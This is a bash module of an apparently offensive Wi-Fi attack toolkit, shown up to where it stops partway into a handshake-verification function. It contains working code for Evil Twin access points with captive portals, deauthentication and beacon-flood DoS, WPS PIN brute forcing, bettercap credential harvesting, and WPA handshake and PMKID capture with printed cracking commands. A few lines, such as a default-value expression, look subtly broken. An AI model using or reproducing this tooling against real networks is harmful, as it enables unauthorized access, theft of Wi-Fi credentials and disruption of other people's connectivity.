#!/bin/bash

# Pentest modules - Evil Twin, handshake capture, password cracking, and advanced attacks



# Quick Evil Twin
quick_evil_twin() {
    clear
    echo -e "${BLUE}Quick Evil Twin Attack${NC}"
    echo -e "${GRAY}======================${NC}"

    # Auto-detect available wireless interfaces
    local available_interfaces=$(get_wireless_interfaces)

    if [[ -z "$available_interfaces" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi

    # Display and select interface
    echo -e "${WHITE}Available wireless interfaces:${NC}"
    local count=0
    local iface_array=()
    for iface in $available_interfaces; do
        count=$((count + 1))
        iface_array+=("$iface")
        local driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}' || echo "unknown")
        echo -e "  ${CYAN}[$count]${NC} $iface ${GRAY}(driver: $driver)${NC}"
    done

    echo ""
    if [[ $count -eq 1 ]]; then
        local base_interface="${iface_array[0]}"
        echo -e "${GREEN}[✓] Auto-selected: $base_interface${NC}"
    else
        read -p "Select interface (1-$count) [1]: " selection
        selection="${selection:-1}"

        if [[ ! "$selection" =~ ^[0-9]+$ ]] || [[ $selection -lt 1 ]] || [[ $selection -gt $count ]]; then
            error "Invalid selection"
            pause
            return
        fi

        local base_interface="${iface_array[$((selection - 1))]}"
        echo -e "${GREEN}[✓] Selected: $base_interface${NC}"
    fi

    # Check if monitor mode is already enabled
    local monitor_interface=""
    if is_monitor_mode "$base_interface"; then
        monitor_interface="$base_interface"
        echo -e "${GREEN}[✓] Already in monitor mode${NC}"
    elif is_monitor_mode "${base_interface}mon"; then
        monitor_interface="${base_interface}mon"
        echo -e "${GREEN}[✓] Monitor interface found: $monitor_interface${NC}"
    else
        # Enable monitor mode
        echo -e "${YELLOW}[*] Enabling monitor mode on $base_interface...${NC}"
        airmon-ng check kill &>/dev/null
        sleep 2

        local monitor_output=$(airmon-ng start "$base_interface" 2>&1)

        # Detect monitor interface name from output
        monitor_interface=$(echo "$monitor_output" | grep -oP '\(monitor mode (?:en|vigor)abled on \K\w+(?:\))' | tr -d ')')
        if [[ -z "$monitor_interface" ]]; then
            # Fallback: try common naming pattern
            monitor_interface="${base_interface}mon"
        fi

        sleep 2

        # Verify monitor mode enabled
        if ! is_monitor_mode "$monitor_interface"; then
            error "Failed to enable monitor mode on $base_interface"
            pause
            return
        fi

        echo -e "${GREEN}[✓] Monitor mode enabled: $monitor_interface${NC}"
    fi

    # Get PHY device for creating virtual interface
    local phy=$(iw dev "$monitor_interface" info 2>/dev/null | grep wiphy | awk '{print $2}')

    if [[ -z "$phy" ]]; then
        error "Could not detect PHY device for $monitor_interface"
        pause
        return
    fi

    echo -e "${YELLOW}[*] PHY device: phy$phy${NC}"

    # Create virtual AP interface (dynamic name based on base interface)
    local interface="${base_interface}ap"

    # Remove old virtual interface if it exists
    iw dev "$interface" del 2>/dev/null
    sleep 1

    # Create new virtual interface
    echo -e "${YELLOW}[*] Creating virtual interface $interface...${NC}"
    if ! iw phy"$phy" interface add "$interface" type __ap 2>/dev/null; then
        error "Failed to create virtual interface"
        echo -e "${RED}[!] Your wireless adapter does not support virtual interfaces (VIF)${NC}"
        echo -e "${RED}[!] Evil Twin attacks require an adapter with VIF support${NC}"
        pause

        # Cleanup
        airmon-ng stop "$monitor_interface" &>/dev/null 2>&1
        systemctl start NetworkManager 2>/dev/null
        return
    fi

    # Bring up virtual interface
    sleep 1
    if ! ip link set "$interface" up 2>/dev/null; then
        error "Failed to bring up virtual interface $interface"
        iw dev "$interface" del 2>/dev/null
        airmon-ng stop "$monitor_interface" &>/dev/null 2>&1
        pause
        return
    fi

    echo -e "${GREEN}[✓] Virtual interface created: $interface${NC}"
    sleep 1

    # Check requirements
    if ! is_monitor_mode "$monitor_interface"; then
        echo -e "${RED}[!] Monitor mode not active on $monitor_interface${NC}"
        iw dev "$interface" del 2>/dev/null
        pause
        return
    fi

    if ! check_vif_support "$interface"; then
        warning "Interface $interface may have limited VIF support"
        echo -e "${YELLOW}[*] Attack may still work, continuing...${NC}"
        sleep 2
    fi
    
    # Get target with number selection
    echo -e "${YELLOW}[*] Select target network...${NC}"

    # Run scan and display networks
    quick_scan_with_numbers "$monitor_interface"
    
    echo ""
    read -p "Select network number: " network_choice
    
    # Get scan data from the temporary file created by quick_scan_with_numbers
    local scan_data=""
    local scan_data_file="/tmp/airwings_scan_data.txt"
    if [[ -f "$scan_data_file" ]]; then
        scan_data=$(cat "$scan_data_file")
        rm -f "$scan_data_file"
    fi
    
    # Extract network details from scan data
    local network_info=$(echo "$scan_data" | sed -n "${network_choice}p")
    
    if [[ -z "$network_info" ]]; then
        error "Invalid selection"
        pause
        return
    fi
    
    # Parse the network info (format: "BSSID|Channel|ESSID")
    local target_bssid=$(echo "$network_info" | cut -d'|' -f1 | xargs)
    local target_channel=$(echo "$network_info" | cut -d'|' -f2 | xargs)
    local target_essid=$(echo "$network_info" | cut -d'|' -f3 | xargs)
    
    if ! is_valid_mac "$target_bssid"; then
        error "Invalid BSSID format"
        pause
        return
    fi
    
    if ! is_valid_channel "$target_channel"; then
        error "Invalid channel"
        pause
        return
    fi
    
    if [[ -z "$target_essid" ]]; then
        target_essid="EvilTwin_$(get_timestamp)"
    fi
    
    echo -e "${YELLOW}[*] Starting Evil Twin attack...${NC}"
    echo -e "${YELLOW}[*] Target: $target_essid ($target_bssid)${NC}"
    echo -e "${YELLOW}[*] Channel: $target_channel${NC}"
    
    # Create temporary directory
    local temp_dir=$(create_temp_dir)
    local portal_dir="$temp_dir/portal"
    mkdir -p "$portal_dir"
    
    # Create basic captive portal
    create_basic_portal "$portal_dir" "$target_essid"
    
    # Start Evil Twin attack
    start_evil_twin_attack "$interface" "$monitor_interface" "$target_bssid" "$target_channel" "$target_essid" "$portal_dir"
    
    # Cleanup
    clean_temp_dir "$temp_dir"
    
    pause
}

# WPS attacks
wps_attacks() {
    clear
    echo -e "${BLUE}WPS Attacks${NC}"
    echo -e "${GRAY}============${NC}"
    
    if ! command -v reaver &> /dev/null; then
        echo -e "${RED}[!] Reaver not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install reaver${NC}"
        pause
        return
    fi
    
    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi
    
    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}WPS Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} Scan for WPS networks"
    echo -e "${CYAN}[2]${NC} Pixie Dust attack (fast)"
    echo -e "${CYAN}[3]${NC} Brute force PIN attack"
    echo -e "${CYAN}[4]${NC} PIN attack with custom PIN"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) scan_wps_networks ;;
        2) pixie_dust_attack ;;
        3) brute_force_wps ;;
        4) custom_pin_attack ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Handshake capture
handshake_capture() {
    clear
    echo -e "${BLUE}Handshake Capture${NC}"
    echo -e "${GRAY}=================${NC}"

    # Cleanup leftover processes from previous scans
    pkill -f airodump-ng 2>/dev/null
    pkill -f hcxdumptool 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    sleep 1

    local interface="${MONITOR_INTERFACE}"

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        error "Monitor mode not enabled. Please enable monitor mode first."
        pause
        return
    fi

    echo -e "${GREEN}[✓] Using monitor interface: $interface${NC}"
    echo ""

    echo -e "${YELLOW}[*] Select target network...${NC}"
    quick_scan_with_numbers "$interface"

    echo ""
    read -p "Select network number: " network_choice

    local scan_data_file="/tmp/airwings_scan_data.txt"
    if [[ ! -f "$scan_data_file" ]]; then
        error "No scan data found"
        pause
        return
    fi

    local network_info=$(sed -n "${network_choice}p" "$scan_data_file")
    rm -f "$scan_data_file"

    if [[ -z "$network_info" ]]; then
        error "Invalid selection"
        pause
        return
    fi

    local target_bssid=$(echo "$network_info" | cut -d'|' -f1 | xargs)
    local target_channel=$(echo "$network_info" | cut -d'|' -f2 | xargs)
    local target_essid=$(echo "$network_info" | cut -d'|' -f3 | xargs)

    if ! is_valid_mac "$target_bssid"; then
        error "Invalid BSSID format"
        pause
        return
    fi

    if ! is_valid_channel "$target_channel"; then
        error "Invalid channel"
        pause
        return
    fi
    
    echo -e "${YELLOW}[*] Target: $target_essid ($target_bssid)${NC}"
    echo -e "${YELLOW}[*] Channel: $target_channel${NC}"
    echo ""

    echo -e "${WHITE}Scan for clients first?${NC}"
    echo -e "${CYAN}[1]${NC} Yes - scan for clients (30s)"
    echo -e "${CYAN}[2]${NC} No - skip directly to capture"
    echo ""
    read -p "Select [1]: " scan_clients
    scan_clients="${scan_clients:-1}"

    local target_client=""
    local client_count=0

    if [[ "$scan_clients" == "1" ]]; then
        echo -e "${YELLOW}[*] Scanning for clients (30 seconds)...${NC}"

        pkill -f airodump-ng 2>/dev/null
        sleep 1

        local client_scan_file=$(mktemp /tmp/client_scan.XXXXXX)
        timeout 32 airodump-ng -c "$target_channel" -w "$client_scan_file" --output-format csv "$interface" &>/dev/null &
        local scan_pid=$!

        for i in $(seq 1 30); do
            echo -ne "\r${YELLOW}[*] Scanning... ${i}/30s${NC}"
            if [[ $i -eq 10 ]] || [[ $i -eq 20 ]]; then
                echo -ne " ${GREEN}[deauth]${NC}"
                aireplay-ng --deauth 3 -a "$target_bssid" "$interface" &>/dev/null &
            fi
            sleep 1
        done
        echo ""

        kill $scan_pid 2>/dev/null
        wait $scan_pid 2>/dev/null

        if [[ -f "${client_scan_file}-01.csv" ]]; then
            local clients=()
            while IFS= read -r line; do
                if echo "$line" | grep -qi "Station MAC"; then
                    continue
                fi
                [[ -z "$line" ]] && continue
                
                local station=$(echo "$line" | cut -d',' -f1 | xargs)
                local sta_bssid=$(echo "$line" | cut -d',' -f6 | xargs)
                
                if [[ "$station" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                    if [[ "$sta_bssid" == "$target_bssid" ]]; then
                        clients+=("$station")
                        client_count=$((client_count + 1))
                    fi
                fi
            done < "${client_scan_file}-01.csv"

            rm -f "${client_scan_file}"*.csv
        fi
        rm -f "$client_scan_file"

        echo ""
        if [[ $client_count -eq 0 ]]; then
            echo -e "${YELLOW}[!] No connected clients detected${NC}"
            echo -e "${YELLOW}[!] Will use broadcast deauth${NC}"
        else
            echo -e "${GREEN}[✓] Found $client_count client(s)${NC}"
            echo -e "${CYAN}[0]${NC} Deauth all clients (broadcast)"
            for i in "${!clients[@]}"; do
                echo -e "${CYAN}[$((i+1))]${NC} ${clients[$i]}"
            done
            echo ""
            read -p "Select client [0 for all]: " client_choice
            client_choice="${client_choice:-0 $client_choice -}"

            if [[ $client_choice -ge 1 ]] && [[ $client_choice -le $client_count ]]; then
                target_client="${clients[$((client_choice - 1))]}"
                echo -e "${GREEN}[✓] Targeting: $target_client${NC}"
            else
                echo -e "${YELLOW}[*] Using broadcast deauth${NC}"
                target_client=""
            fi
        fi
    fi

    echo ""
    echo -e "${YELLOW}[*] Starting handshake capture...${NC}"

    local timestamp=$(get_timestamp)
    local capture_file="$LOGS_DIR/captures/handshake_${target_essid// /_}_${timestamp}"
    mkdir -p "$LOGS_DIR/captures"

    local hs_session=""
    if command -v tmux >/dev/null 2>&1; then
        hs_session="airwings_hs_${timestamp}"
        tmux new-session -d -s "$hs_session" "airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file $interface"
        echo -e "${YELLOW}[*] Started airodump in tmux: $hs_session${NC}"
    elif command -v screen >/dev/null 2>&1; then
        hs_session="airwings_hs_${timestamp}"
        screen -dmS "$hs_session" bash -c "airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file $interface"
        echo -e "${YELLOW}[*] Started airodump in screen: $hs_session${NC}"
    else
        airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$capture_file" "$interface" &
    fi

    sleep 5

    echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
    for i in {1..5}; do
        if [[ -n "$target_client" ]]; then
            echo -e "${CYAN}[*] Deauthing client: $target_client${NC}"
            aireplay-ng --deauth 10 -a "$target_bssid" -c "$target_client" "$interface" 2>&1 | grep -E "(Sent.*packets|Nothing to send)" || true
        else
            echo -e "${CYAN}[*] Broadcasting deauth${NC}"
            aireplay-ng --deauth 10 -a "$target_bssid" "$interface" 2>&1 | grep -E "(Sent.*packets|Nothing to send)" || true
        fi
        sleep 2
    done

    sleep 5

    if [[ -n "$hs_session" ]]; then
        if command -v tmux >/dev/null 2>&1; then
            tmux kill-session -t "$hs_session" 2>/dev/null
        elif command -v screen >/dev/null 2>&1; then
            screen -S "$hs_session" -X quit 2>/dev/null
        fi
    else
        pkill -f "airodump-ng.*${capture_file}" 2>/dev/null
    fi
    
    if [[ -f "${capture_file}-01.cap" ]]; then
        echo -e "${YELLOW}[*] Verifying handshake...${NC}"
        sleep 2
        
        local handshake_result=$(aircrack-ng "${capture_file}-01.cap" 2>&1)
        
        if echo "$handshake_result" | grep -q "1 handshake"; then
            echo ""
            echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║          ✓ HANDSHAKE CAPTURED SUCCESSFULLY!                ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${WHITE}Saved: ${capture_file}-01.cap${NC}"
            
            if command -v wpaclean &>/dev/null; then
                wpaclean "${capture_file}-clean.cap" "${capture_file}-01.cap" 2>/dev/null
                echo -e "${WHITE}Cleaned: ${capture_file}-clean.cap${NC}"
            fi
            echo ""
            echo -e "${CYAN}[*] Crack with:${NC}"
            echo -e "   aircrack-ng -w wordlist.txt ${capture_file}-01.cap"
            echo -e "   hashcat -m 22000 ${capture_file}-01.cap wordlist.txt"
        else
            echo ""
            echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║          ✗ FAILED TO CAPTURE HANDSHAKE                     ║${NC}"
            echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${YELLOW}[!] Possible reasons:${NC}"
            echo -e "   - No clients connected"
            echo -e "   - PMF (802.11w) enabled"
            echo -e "   - Weak signal"
            echo ""
            echo -e "${WHITE}What would you like to do?${NC}"
            echo -e "${CYAN}[1]${NC} Try again (rescan)"
            echo -e "${CYAN}[2]${NC} Try PMKID capture instead"
            echo -e "${CYAN}[3]${NC} Return to menu"
            echo ""
            read -p "Select [3]: " retry_choice
            retry_choice="${retry_choice:-3}"
            
            case $retry_choice in
                1)
                    echo -e "${YELLOW}[*] Running handshake capture again...${NC}"
                    sleep 2
                    handshake_capture
                    return
                    ;;
                2)
                    echo -e "${YELLOW}[*] Starting PMKID capture...${NC}"
                    sleep 2
                    pmkid_capture
                    return
                    ;;
                *)
                    return
                    ;;
            esac
        fi
    else
        error "Capture file not found"
    fi
    
    pause
}

# DoS attacks
dos_attacks() {
    clear
    echo -e "${BLUE}Denial of Service Attacks${NC}"
    echo -e "${GRAY}=============================${NC}"
    
    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi
    
    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}DoS Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} Deauthentication attack"
    echo -e "${CYAN}[2]${NC} Authentication flood"
    echo -e "${CYAN}[3]${NC} AMOK attack (all networks)"
    echo -e "${CYAN}[4]${NC} WIDS confusion"
    echo -e "${CYAN}[5]${NC} Beacon flood"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) deauth_attack ;;
        2) auth_flood ;;
        3) amok_attack ;;
        4) wids_confusion ;;
        5) beacon_flood ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Enterprise attacks
enterprise_attacks() {
    clear
    echo -e "${BLUE}Enterprise Attacks${NC}"
    echo -e "${GRAY}===================${NC}"
    
    if ! command -v bettercap &> /dev/null; then
        echo -e "${RED}[!] bettercap not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
        pause
        return
    fi
    
    echo -e "${WHITE}Enterprise Attack Options:${NC}"
    echo -e "${CYAN}[1]${NC} EAP sniffing"
    echo -e "${CYAN}[2]${NC} Credential harvesting"
    echo -e "${CYAN}[3]${NC} Rogue RADIUS attack"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) eap_sniffing ;;
        2) credential_harvesting ;;
        3) rogue_radius ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Helper functions for attacks

# Scan WPS networks
scan_wps_networks() {
    echo -e "${YELLOW}[*] Scanning for WPS networks...${NC}"
    wash -i "$MONITOR_INTERFACE" -C
}

# Pixie Dust attack
pixie_dust_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    
    echo -e "${YELLOW}[*] Starting Pixie Dust attack...${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -K 1 -vv
}

# Brute force WPS
brute_force_wps() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    
    echo -e "${YELLOW}[*] Starting WPS brute force...${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -vv
}

# Custom PIN attack
custom_pin_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target channel: " target_channel
    read -p "Enter WPS PIN (8 digits): " custom_pin
    
    if [[ ! "$custom_pin" =~ ^[0-9]{8}$ ]]; then
        error "Invalid PIN format (must be 8 digits)"
    fi
    
    echo -e "${YELLOW}[*] Testing custom PIN: $custom_pin${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -p "$custom_pin" -vv
}

# Deauthentication attack
deauth_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter client MAC (leave empty for all): " client_mac
    read -p "Number of deauth packets [default: 100]: " packet_count
    
    if [[ -z "$packet_count" ]]; then
        packet_count=100
    fi
    
    echo -e "${YELLOW}[*] Sending $packet_count deauth packets...${NC}"
    
    if [[ -n "$client_mac" ]]; then
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" -c "$client_mac" "$MONITOR_INTERFACE"
    else
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" "$MONITOR_INTERFACE"
    fi
}

# Authentication flood
auth_flood() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Number of auth frames [default: 1000]: " frame_count
    
    if [[ -z "$frame_count" ]]; then
        frame_count=1000
    fi
    
    echo -e "${YELLOW}[*] Flooding with $frame_count authentication frames...${NC}"
    aireplay-ng --auth "$frame_count" -a "$target_bssid" -h "$(generate_random_mac)" "$MONITOR_INTERFACE"
}

# AMOK attack
amok_attack() {
    echo -e "${YELLOW}[*] Starting AMOK attack (all networks)...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    
    mdk4 "$MONITOR_INTERFACE" amok
}

# WIDS confusion
wids_confusion() {
    echo -e "${YELLOW}[*] Starting WIDS confusion attack...${NC}"
    mdk4 "$MONITOR_INTERFACE" wids
}

# Beacon flood
beacon_flood() {
    read -p "Enter SSID for fake APs: " fake_ssid
    read -p "Number of fake APs [default: 100]: " ap_count
    
    if [[ -z "$fake_ssid" ]]; then
        fake_ssid="FAKE_AP"
    fi
    
    if [[ -z "$ap_count" ]]; then
        ap_count=100
    fi
    
    echo -e "${YELLOW}[*] Starting beacon flood with $ap_count fake APs...${NC}"
    mdk4 "$MONITOR_INTERFACE" beacon -e "$fake_ssid" -c $ap_count
}

# EAP sniffing
eap_sniffing() {
    echo -e "${YELLOW}[*] Starting EAP sniffing...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    
    bettercap -iface "$SELECTED_INTERFACE" -eval "set wifi.deauth off; set wifi.ap.ssid fakeap; set wifi.ap.bssid $(generate_random_mac); wifi.recon on; set net.sniff.verbose true; set net.sniff.filter eapol; net.sniff on"
}

# Credential harvesting
credential_harvesting() {
    echo -e "${YELLOW}[*] Starting credential harvesting...${NC}"
    bettercap -iface "$SELECTED_INTERFACE" -eval "wifi.recon on; set wifi.ssid.HARVEST wifi.recon.channel; set wifi.ap.bssid $(generate_random_mac); wifi.ap; set net.sniff.verbose true; set net.sniff.filter port.http; net.sniff on"
}

# Rogue RADIUS
rogue_radius() {
    echo -e "${YELLOW}[*] Starting rogue RADIUS server...${NC}"
    echo -e "${RED}[!] This is advanced - ensure you understand the risks${NC}"
    
    # This would require additional setup
    echo -e "${YELLOW}[!] Rogue RADIUS implementation coming soon${NC}"
    pause
}

# ══════════════════════════════════════════════════════════════
# Password Menu (Main Menu Option 6)
# ══════════════════════════════════════════════════════════════

password_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}               HANDSHAKE & PASSWORD                      ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} Capture Handshake         ${GRAY}WPA/WPA2 4-way handshake${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Capture PMKID             ${GRAY}Clientless PMKID attack${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} Verify Handshake          ${GRAY}Check capture validity${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Crack with Aircrack-ng    ${GRAY}CPU dictionary attack${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} Crack with Hashcat        ${GRAY}GPU-accelerated cracking${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Crack with John           ${GRAY}John the Ripper${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Convert Handshake         ${GRAY}cap to hccapx/hc22000${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[8]${WHITE} Manage Wordlists          ${GRAY}View and download lists${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) handshake_capture ;;
            2) pmkid_capture ;;
            3) verify_handshake ;;
            4) crack_aircrack ;;
            5) crack_hashcat ;;
            6) crack_john ;;
            7) convert_handshake ;;
            8) manage_wordlists ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# PMKID capture (clientless attack)
pmkid_capture() {
    clear
    echo -e "${BLUE}PMKID Capture${NC}"
    echo -e "${GRAY}=============${NC}"

    # Cleanup leftover processes
    pkill -f airodump-ng 2>/dev/null
    pkill -f hcxdumptool 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    sleep 1

    local interface="${MONITOR_INTERFACE}"

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]] || ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode not enabled${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        pause
        return
    fi

    if ! command -v hcxdumptool &>/dev/null; then
        echo -e "${RED}[!] hcxdumptool not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hcxdumptool hcxtools${NC}"
        pause
        return
    fi

    # Test if hcxdumptool works
    if ! timeout 2 hcxdumptool --help &>/dev/null; then
        echo -e "${RED}[!] hcxdumptool is not working properly${NC}"
        echo -e "${YELLOW}[!] Try reinstalling: sudo apt install hcxdumptool${NC}"
        pause
        return
    fi

    echo -e "${GREEN}[✓] Using monitor interface: $interface${NC}"
    echo ""

    # Get target with numbered selection
    echo -e "${YELLOW}[*] Select target network...${NC}"
    quick_scan_with_numbers "$interface"

    echo ""
    read -p "Select network number: " network_choice

    # Get scan data from the temporary file created by quick_scan_with_numbers
    local scan_data=""
    local scan_data_file="/tmp/airwings_scan_data.txt"
    if [[ -f "$scan_data_file" ]]; then
        scan_data=$(cat "$scan_data_file")
        rm -f "$scan_data_file"
    fi

    # Extract network details from scan data
    local network_info=$(echo "$scan_data" | sed -n "${network_choice}p")

    if [[ -z "$network_info" ]]; then
        error "Invalid selection"
        pause
        return
    fi

    # Parse the network info (format: "BSSID|Channel|ESSID")
    local target_bssid=$(echo "$network_info" | cut -d'|' -f1 | xargs)
    local target_channel=$(echo "$network_info" | cut -d'|' -f2 | xargs)
    local target_essid=$(echo "$network_info" | cut -d'|' -f3 | xargs)

    if ! is_valid_mac "$target_bssid"; then
        error "Invalid BSSID format from scan"
        pause
        return
    fi

    if ! is_valid_channel "$target_channel"; then
        error "Invalid channel from scan"
        pause
        return
    fi
    
    echo -e "${YELLOW}[*] Target: $target_essid ($target_bssid)${NC}"
    echo -e "${YELLOW}[*] Channel: $target_channel${NC}"
    echo ""

    local timestamp=$(get_timestamp)
    local capture_file="$LOGS_DIR/captures/pmkid_${target_essid// /_}_${timestamp}.pcapng"
    mkdir -p "$LOGS_DIR/captures"

    echo -e "${YELLOW}[*] Starting PMKID capture (60 seconds)...${NC}"
    echo -e "${YELLOW}[*] This attack does NOT require connected clients${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop early${NC}"
    echo ""

    # Set target channel for interface
    iw dev "$interface" set channel "$target_channel" &>/dev/null

    # Run hcxdumptool - show output to see what's happening
    local filter_file=$(mktemp)
    echo "$target_bssid" | tr -d ':' > "$filter_file"
    
    # Run hcxdumptool with visible status
    timeout 62 hcxdumptool -i "$interface" -o "$capture_file" --filterlist_ap="$filter_file" --filtermode=2 --enable_status=1 2>&1 | while IFS= read -r line; do
        if echo "$line" | grep -q "EAPOL\|PMKID\|FOUND"; then
            echo -e "${CYAN}$line${NC}"
        fi
    done &
    local hcxdump_pid=$!

    # Show progress
    for i in $(seq 1 60); do
        if ! kill -0 $hcxdump_pid 2>/dev/null; then
            break
        fi
        echo -ne "\r${YELLOW}[*] Capturing... ${i}/60s${NC}"
        sleep 1
    done
    echo ""

    # Kill hcxdumptool if still running
    kill $hcxdump_pid 2>/dev/null
    wait $hcxdump_pid 2>/dev/null
    rm -f "$filter_file"
    sleep 1

    # Cleanup - kill any leftover hcxdumptool processes
    pkill -f hcxdumptool 2>/dev/null

    if [[ -f "$capture_file" ]]; then
        echo -e "${YELLOW}[*] Processing capture file...${NC}"
        local hash_file="$LOGS_DIR/captures/pmkid_${target_essid// /_}_${timestamp}.hc22000"
        hcxpcapngtool "$capture_file" -o "$hash_file" 2>&1

        if [[ -s "$hash_file" ]]; then
            local count=$(wc -l < "$hash_file")
            echo ""
            echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║            ✓ PMKID CAPTURED SUCCESSFULLY!                ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${WHITE}Hash file: $hash_file${NC}"
            echo -e "${CYAN}[*] Crack with:${NC}"
            echo -e "   hashcat -m 22000 $hash_file <wordlist>"
        else
            echo ""
            echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║              ✗ NO PMKID CAPTURED                         ║${NC}"
            echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${YELLOW}[!] Possible reasons:${NC}"
            echo -e "   - Network doesn't support PMKID (rare)"
            echo -e "   - PMF (802.11w) enabled"
            echo -e "   - Target not responding to PMKID requests"
            echo ""
            echo -e "${WHITE}What would you like to do?${NC}"
            echo -e "${CYAN}[1]${NC} Try again (rescan)"
            echo -e "${CYAN}[2]${NC} Try handshake capture instead"
            echo -e "${CYAN}[3]${NC} Return to menu"
            echo ""
            read -p "Select [3]: " retry_choice
            retry_choice="${retry_choice:-3}"
            
            # Cleanup before retrying
            pkill -f hcxdumptool 2>/dev/null
            pkill -f airodump-ng 2>/dev/null
            sleep 1
            
            case $retry_choice in
                1)
                    echo -e "${YELLOW}[*] Running PMKID capture again...${NC}"
                    sleep 2
                    pmkid_capture
                    return
                    ;;
                2)
                    echo -e "${YELLOW}[*] Starting handshake capture...${NC}"
                    sleep 2
                    handshake_capture
                    return
                    ;;
                *)
                    return
                    ;;
            esac
        fi
    else
        error "Capture file not created - hcxdumptool failed"
        echo -e "${YELLOW}[!] Possible causes:${NC}"
        echo -e "   - Interface lost monitor mode"
        echo -e "   - hcxdumptool crashed"
        echo -e "   - Permission issues"
        echo ""
        echo -e "${CYAN}[*] Try switching to a different interface or restart monitor mode${NC}"
    fi

    # Cleanup
    pkill -f hcxdumptool 2>/dev/null
    pkill -f airodump-ng 2>/dev/null

    pause
}

# Verify handshake file
verify_handshake() {
    clear
    echo -e "${BLUE}Verify Handshake${NC}"
